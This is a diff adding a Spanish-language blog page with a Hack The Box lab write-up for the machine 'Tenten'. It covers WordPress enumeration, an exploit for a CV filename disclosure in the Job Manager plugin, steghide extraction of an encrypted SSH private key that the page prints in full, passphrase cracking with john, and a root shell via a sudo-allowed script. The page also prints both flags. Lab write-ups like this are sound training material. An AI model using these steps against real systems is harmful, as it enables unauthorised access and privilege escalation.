@@ -1,0 +1,321 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Tenten (medium) · MiguelRega7</title>
+<meta name="description" content="- Tenten is a medium difficulty machine that requires some outside-the-box/CTF-style thinking to complete. It demonstrates the severity of using outdated Wordpress plugins, which i"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Tenten (medium)</h1><div class="meta"><span>◷</span><time>2024-11-02</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- Tenten is a medium difficulty machine that requires some outside-the-box/CTF-style thinking to complete. It demonstrates the severity of using outdated Wordpress plugins, which i.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeraci-n">Enumeración</a><a href="#shell-as-takis">Shell as takis</a><a href="#user-flag">User flag</a><a href="#privilege-escalation">Privilege Escalation</a><a href="#root-flag">Root flag</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/e58a465e93364c423cd2162945f8f7bf.png">
+</p>
+
+<ul>
+<li>Tenten is a medium difficulty machine that requires some outside-the-box/CTF-style thinking to complete. It demonstrates the severity of using outdated Wordpress plugins, which is a major attack vector that exists in real life.</li>
+</ul>
+<h2 id="portscan">PortScan</h2>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo nmap -sCV -p22,80 10.10.10.10 -oG allPorts
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-02 18:57 CST
+Nmap scan report for 10.10.10.10
+Host is up (0.18s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
+|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
+|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18
+|_http-title: Did not follow redirect to http://tenten.htb/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+<h2 id="enumeraci-n">Enumeración</h2>
+<ul>
+<li>Tenemos un subdominio vamos agregarlo al <code>/etc/hosts</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ echo &quot;10.10.10.10 tenten.htb&quot; | sudo tee -a /etc/hosts
+10.10.10.10 tenten.htb
+</code></pre></div></div>
+<ul>
+<li>También lo pudimos haber visto de esta forma.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl -I http://10.10.10.10
+HTTP/1.1 301 Moved Permanently
+Date: Sun, 03 Nov 2024 00:59:56 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Location: http://tenten.htb/
+Content-Type: text/html; charset=iso-8859-1
+</code></pre></div></div>
+<ul>
+<li>Tenemos un <code>WordPress</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/1.png">
+</p>
+
+<ul>
+<li>Es un <code>WordPress</code> de versión <code>4.7.3</code>.</li>
+</ul>
+<div class="code-window" data-language="Ruby"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Ruby</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-ruby">❯ whatweb http://tenten.htb
+http://tenten.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.10], JQuery[1.12.4], MetaGenerator[WordPress 4.7.3], PoweredBy[WordPress,WordPress,], Script[text/javascript], Title[Job Portal &amp;#8211; Just another WordPress site], UncommonHeaders[link], WordPress[4.7.3]
+</code></pre></div></div>
+<ul>
+<li>Comenzamos enumerando usuarios <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#active-enumeration">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#active-enumeration</a> siguiente instrucciones vemos que si lanzamos una petición al <code>id</code> <code>1</code> nos responde con un <code>301</code> pero nos da el nombre de un usuario llamado <code>takis</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl -s -I -X GET 'http://tenten.htb/?author=1'
+HTTP/1.1 301 Moved Permanently
+Date: Sun, 03 Nov 2024 01:05:04 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Location: http://tenten.htb/index.php/author/takis/
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+</code></pre></div></div>
+<ul>
+<li>Vamos a usar la herramienta <code>wpscan</code> para escanear el <code>Wordpress</code> y encontrar ya sea <code>themes</code>, <code>plugins</code> y mas usuarios.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ wpscan --url http://10.10.10.10 -e ap,t,tt,u
+</code></pre></div></div>
+<ul>
+<li>Encontramos un Plugin.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">[i] Plugin(s) Identified:
+
+[+] job-manager
+ | Location: http://tenten.htb/wp-content/plugins/job-manager/
+ | Latest Version: 0.7.25 (up to date)
+ | Last Updated: 2015-08-25T22:44:00.000Z
+ |
+ | Found By: Urls In Homepage (Passive Detection)
+ |
+ | Version: 7.2.5 (80% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://tenten.htb/wp-content/plugins/job-manager/readme.txt
+</code></pre></div></div>
+<ul>
+<li>Encontramos el <code>theme</code> en uso.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">[+] WordPress theme in use: twentyseventeen
+ | Location: http://tenten.htb/wp-content/themes/twentyseventeen/
+ | Last Updated: 2024-07-16T00:00:00.000Z
+ | Readme: http://tenten.htb/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 3.7
+ | Style URL: http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver=4.7.3
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: 'Version: 1.1'
+</code></pre></div></div>
+<ul>
+<li><p>Si buscamos en internet tiene vulnerabilidades <a href="https://github.com/jimdiroffii/CVE-2015-6668">https://github.com/jimdiroffii/CVE-2015-6668</a>.</p>
+</li>
+<li><p>El Plugin <code>WP Job Manager</code> es popular en <code>WordPress</code> ya que se utiliza para gestionar ofertas de empleo en sitios web.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/2.png">
+</p>
+
+<ul>
+<li>Si le damos en <code>Apply Now</code> nos pide datos.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/3.png">
+</p>
+
+<ul>
+<li>Basándonos en el GitHub vamos a iterar el numero para ver la respuesta que obtenemos.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/4.png">
+</p>
+
+<ul>
+<li>Si vamos a la petición 13 vemos que obtenemos un nombre raro en el <code>Job Application</code>.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/5.png">
+</p>
+
+<ul>
+<li>Básicamente en esa parte se suben <code>CV</code> y si usamos el script y le pasamos el nombre del <code>Title</code> vemos que nos reporta esto, esta vulnerabilidad nos permite filtrar títulos de publicaciones en la base de datos incluyendo cosas privadas es por eso que nos reporte una imagen.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ python3 exploit.py
+
+CVE-2015-6668
+Title: CV filename disclosure on Job-Manager WP Plugin
+Author: Evangelos Mourikis
+Blog: https://vagmour.eu
+Plugin URL: http://www.wp-jobmanager.com
+Versions: &lt;=0.7.25
+
+Enter a vulnerable website: http://tenten.htb 
+Enter a file name: HackerAccessGranted
+[+] URL of CV found! http://tenten.htb/wp-content/uploads/2017/04/HackerAccessGranted.jpg
+</code></pre></div></div>
+<ul>
+<li>Esta es la imagen.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/tenten/6.png">
+</p>
+
+<ul>
+<li>Vamos a guardarla.</li>
+</ul>
+<h2 id="shell-as-takis">Shell as takis</h2>
+<ul>
+<li>Con la herramienta <code>steghide</code> podemos ver información oculta si la usamos podemos observar que nos dicen sobre una <code>id_rsa</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ steghide info HackerAccessGranted.jpg
+&quot;HackerAccessGranted.jpg&quot;:
+  format: jpeg
+  capacity: 15.2 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+  embedded file &quot;id_rsa&quot;:
+    size: 1.7 KB
+    encrypted: rijndael-128, cbc
+    compressed: yes
+</code></pre></div></div>
+<ul>
+<li>Podemos extraerla.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ steghide extract -sf  HackerAccessGranted.jpg
+Enter passphrase: 
+wrote extracted data to &quot;id_rsa&quot;.
+</code></pre></div></div>
+<ul>
+<li>La tenemos pero encriptada.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,7265FC656C429769E4C1EEFC618E660C
+
+/HXcUBOT3JhzblH7uF9Vh7faa76XHIdr/Ch0pDnJunjdmLS/laq1kulQ3/RF/Vax
+tjTzj/V5hBEcL5GcHv3esrODlS0jhML53lAprkpawfbvwbR+XxFIJuz7zLfd/vDo
+1KuGrCrRRsipkyae5KiqlC137bmWK9aE/4c5X2yfVTOEeODdW0rAoTzGufWtThZf
+K2ny0iTGPndD7LMdm/o5O5As+ChDYFNphV1XDgfDzHgonKMC4iES7Jk8Gz20PJsm
+SdWCazF6pIEqhI4NQrnkd8kmKqzkpfWqZDz3+g6f49GYf97aM5TQgTday2oFqoXH
+WPhK3Cm0tMGqLZA01+oNuwXS0H53t9FG7GqU31wj7nAGWBpfGodGwedYde4zlOBP
+VbNulRMKOkErv/NCiGVRcK6k5Qtdbwforh+6bMjmKE6QvMXbesZtQ0gC9SJZ3lMT
+J0IY838HQZgOsSw1jDrxuPV2DUIYFR0W3kQrDVUym0BoxOwOf/MlTxvrC2wvbHqw
+AAniuEotb9oaz/Pfau3OO/DVzYkqI99VDX/YBIxd168qqZbXsM9s/aMCdVg7TJ1g
+2gxElpV7U9kxil/RNdx5UASFpvFslmOn7CTZ6N44xiatQUHyV1NgpNCyjfEMzXMo
+6FtWaVqbGStax1iMRC198Z0cRkX2VoTvTlhQw74rSPGPMEH+OSFksXp7Se/wCDMA
+pYZASVxl6oNWQK+pAj5z4WhaBSBEr8ZVmFfykuh4lo7Tsnxa9WNoWXo6X0FSOPMk
+tNpBbPPq15+M+dSZaObad9E/MnvBfaSKlvkn4epkB7n0VkO1ssLcecfxi+bWnGPm
+KowyqU6iuF28w1J9BtowgnWrUgtlqubmk0wkf+l08ig7koMyT9KfZegR7oF92xE9
+4IWDTxfLy75o1DH0Rrm0f77D4HvNC2qQ0dYHkApd1dk4blcb71Fi5WF1B3RruygF
+2GSreByXn5g915Ya82uC3O+ST5QBeY2pT8Bk2D6Ikmt6uIlLno0Skr3v9r6JT5J7
+L0UtMgdUqf+35+cA70L/wIlP0E04U0aaGpscDg059DL88dzvIhyHg4Tlfd9xWtQS
+VxMzURTwEZ43jSxX94PLlwcxzLV6FfRVAKdbi6kACsgVeULiI+yAfPjIIyV0m1kv
+5HV/bYJvVatGtmkNuMtuK7NOH8iE7kCDxCnPnPZa0nWoHDk4yd50RlzznkPna74r
+Xbo9FdNeLNmER/7GGdQARkpd52Uur08fIJW2wyS1bdgbBgw/G+puFAR8z7ipgj4W
+p9LoYqiuxaEbiD5zUzeOtKAKL/nfmzK82zbdPxMrv7TvHUSSWEUC4O9QKiB3amgf
+yWMjw3otH+ZLnBmy/fS6IVQ5OnV6rVhQ7+LRKe+qlYidzfp19lIL8UidbsBfWAzB
+9Xk0sH5c1NQT6spo/nQM3UNIkkn+a7zKPJmetHsO4Ob3xKLiSpw5f35SRV+rF+mO
+vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
+YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
+-----END RSA PRIVATE KEY-----
+</code></pre></div></div>
+<ul>
+<li>Esta es la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ /usr/share/john/ssh2john.py id_rsa &gt; hash
+❯ john hash -w:/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+superpassword    (id_rsa)     
+1g 0:00:00:01 DONE (2024-11-02 20:06) 0.7462g/s 582113p/s 582113c/s 582113C/s superpene..supermoy
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+<h2 id="user-flag">User flag</h2>
+<ul>
+<li>Vamos a conectarnos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ chmod 600 id_rsa
+                                                                                                
+❯ ssh -i id_rsa takis@10.10.10.10
+The authenticity of host '10.10.10.10 (10.10.10.10)' can't be established.
+ED25519 key fingerprint is SHA256:5a3db7g5K/KVQU7u9yholvmJI7kp3pWZj0qtGz4Yr9Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.10' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+65 packages can be updated.
+39 updates are security updates.
+
+
+Last login: Fri May  5 23:05:36 2017
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &lt;command&gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+takis@tenten:~$ export TERM=xterm
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">takis@tenten:~$ cat user.txt 
+2147f10efc4677c6e852f9a0b765e848
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li><p>Podemos ejecutar sin proporcionar contraseña <code>/bin/fuckin</code> como root.</p>
+</li>
+<li><p>Este es su contenido.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">takis@tenten:~$ file /bin/fuckin
+/bin/fuckin: Bourne-Again shell script, ASCII text executable
+takis@tenten:~$ cat /bin/fuckin
+#!/bin/bash
+$1 $2 $3 $4
+</code></pre></div></div>
+<ul>
+<li>Si le concatenamos un comando lo ejecuta.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">takis@tenten:~$ sudo /bin/fuckin id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div>
+<h2 id="root-flag">Root flag</h2>
+<ul>
+<li>Vamos a ejecutar una bash.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">takis@tenten:~$ sudo /bin/fuckin /bin/bash
+root@tenten:~# whoami
+root
+root@tenten:~# cat /root/root.txt 
+d2fbb02fd8fa5e734ecbc1ca8cedf07e
+root@tenten:~# 
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
